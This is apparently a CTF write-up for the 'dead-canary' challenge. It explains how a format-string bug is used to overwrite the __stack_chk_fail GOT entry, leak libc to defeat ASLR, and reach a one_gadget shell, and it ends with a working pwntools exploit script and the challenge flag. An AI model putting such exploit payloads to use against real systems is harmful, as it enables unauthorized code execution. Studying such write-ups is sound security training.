---
layout: post
title: "dead-canary"
author: "raghul-rajasekar"
---

It is a terrible crime to slay a canary. Killing a canary will keep your exploit alive even if you are an inch from segfaults. But at a terrible price.
`nc 2020.redpwnc.tf 31744`

**Files:**
- [dead-canary]({{site.baseurl}}/assets/dead-canary/dead-canary)

## Solution

Let's take a look at the disassembly of `dead-canary` using IDA:

![secret-flag disassembly]({{site.baseurl}}/assets/dead-canary/dead-canary.png)

Seems similar to `secret-flag`: canary-enabled, program reads input once and prints it back using `printf`, creating a format-string vulnerability. The only difference here is that the flag isn't read into memory: we'll have to create a reverse shell to access the flag. This is a lot harder than `secret-flag` because we'll now have to write over addresses and that means having to deal with the canary. Or does it?

### Writing using format-string vulnerability
Format-string vulnerabilities are very useful to launch an attack because they not only let us read from any address, they also let us _write_ to any address using the `%n` format specifier. Given an address as an argument, it stores a 4-byte value equal to the number of characters printed by `printf` before `%n`. For us, it's a hack allowing us to load an address onto the stack as an argument and write values to that address. `%hn` gives us more fine-grained control by letting us write 2 bytes at a time. However, the fact stands that for whatever value we want to write, that many characters must be printed. To avoid filling up the buffer unnecessarily, we can use the _padding_ feature of format specifiers. For example, `%20d` prints an integer with suitable padding such that 20 characters are printed. Using these facts and the fact that we can give some address in the buffer and use the `%x$n` to write to that address (after suitably calculating `x`), we can now theoretically overwrite any value in memory.

### Need for `one_gadget`
Before we get to how we're going to bypass the canary check, it's important to note that the `read` instruction in the `dead-canary` binary only allows us to overwrite the canary value, previous frame's base address (which isn't important anyway) and the return address using buffer overflow. Also, we won't be able to overwrite values on the stack as ASLR would be enabled and we wouldn't know the stack addresses beforehand, meaning that we can only rely on buffer overflow to overwrite stack values. This means we won't be able to stitch gadgets on the stack and will have to rely on `one_gadget` to provide us with a single address which we can jump to and execute to open a shell.

I went ahead assuming the `libc` file is the same as the one provided for the previous question, `the-library` (luckily I was right). Out of the three gadgets found, two of them relied on certain sections of the stack being zeroed out, which is hard to ensure. The gadget I chose, located at offset `0x4f2c5` in `libc`, required that the stack is aligned to 16 bytes and `rcx` is zeroed out. The second constraint is harder to satisfy as the canary check uses the `rcx` register. The check loads the canary value from the stack into `rcx`, XORs `rcx` with the stored canary value and calls `__stack_chk_fail` if `rcx` is not 0, which aborts the program. Thus, to create a reverse shell, we will have to "gracefully" bypass the canary check, ensuring that `rcx` is set to 0 as well. How do we do that?

### Bypassing canary check by overwriting GOT
To achieve this, we can first use the idea of overwriting values using `printf` to overwrite the GOT entry for `__stack_chk_fail`, making it jump elsewhere instead of aborting the program. However, we can't directly jump to the gadget due to ASLR. We will have to find the offset of `libc`, return back to the beginning of `main`, calculate the offset at which the gadget would be located in memory and overwrite the return address with this value using buffer overflow.

To ensure that `rcx` is set to 0, we can overwrite the GOT entry for `__stack_chk_fail` (located at `0x601028`) to make it point to the instruction where `rcx` is XORed with the actual canary value (`xor rcx, fs:28h` at `0x4007ea`), meaning that `rcx` eventually gets XORed twice with the value and finally holds the canary value from the stack. If we set this stack canary value to 0, the canary check will be passed and `rcx` would hold 0, which is what we want. Thus, we can freely perform buffer overflow afterwards while simply ensuring that the stack canary value is set to 0 each time.

### Bypassing ASLR
Finally, we need to find some known address from `libc` in order to calculate the offset at which it's loaded. We can use the GOT entry for `setbuf` for this (located at `0x601030`). We know that `setbuf` is located at an offset of `0x884d0` within `libc`, so we can calculate the new offset of the gadget using this.

To find the value of the GOT entry itself, we can use the `%s` format specifier. Thus, the overall idea is to send two payloads. The first payload achieves the following:
- Overwrites the GOT entry of `__stack_chk_fail` to `0x4007ea`
- Leaks the GOT entry of `setbuf`
- Sets stack canary value to 0
- Overwrites return value to beginning of `main` (at `0x400738`)

The second payload achieves the following:
- Sets stack canary value to 0
- Jumps to our gadget

The code below roughly illustrates the attack:

```python
from pwn import remote
p = remote('2020.redpwnc.tf', 31744)
payload0 = b'%10$s%2020d%9$hn\x00\x00\x00\x00\x00\x00\x00\x00\x28\x10\x60\x00\x00\x00\x00\x00\x30\x10\x60\x00\x00\x00\x00\x00' + b'abcd'*56 + b'\x00\x00\x00\x00\x00\x00\x00\x00abcdabcd\x38\x07\x40\x00\x00\x00\x00\x00'  # Find GOT table entry of setbuf, print appropriate number of spaces and overwrite GOT entry of __stack_chk_fail with location of instruction which XORs canary with rcx, JUNK, make sure location of canary is zeroed out, return to start of main
p.read()
p.write(payload0)
ret = p.read()
hex(int(ret[11:5:-1].hex(), 16) - int('884d0', 16) + int('4f2c5', 16))
payload1 = b'abcd'*66 + b'\x00\x00\x00\x00\x00\x00\x00\x00abcdabcd\xc5\xe2\xa7\xc7\x2f\x7f\x00\x00'  # Ended up calculating the gadget address manually
p.write(payload1)
p.interactive()  # do whatever you want with shell here
```

## Flag

`flag{t0_k1ll_a_canary_4e47da34}`
